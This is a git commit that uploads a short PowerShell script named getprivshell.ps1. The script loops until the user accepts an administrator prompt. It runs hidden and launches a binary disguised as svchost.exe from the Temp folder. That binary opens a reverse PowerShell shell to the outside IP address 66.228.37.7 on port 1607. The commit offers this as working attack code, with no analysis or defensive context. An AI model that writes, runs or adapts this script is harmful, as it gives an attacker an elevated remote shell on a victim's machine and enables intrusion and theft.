1dc0ac76551c97ba8a379bf661c1195c146a57af
RedTheMenace <101410080+RedTheMenace@users.noreply.github.com>
2023-02-10 09:39:21 -0500

    Add files via upload

---
+++ getprivshell.ps1
@@ -0,0 +1,6 @@
+﻿while ($true) {
+    $result = Start-Process powershell -windowstyle Hidden -Verb runAs -Wait -PassThru -ArgumentList 'C:\Users\Administrator\AppData\Local\Temp\svchost.exe 66.228.37.7 1607 -e powershell'
+    if ($result.ExitCode -eq 0) {
+        break
+    }
+}
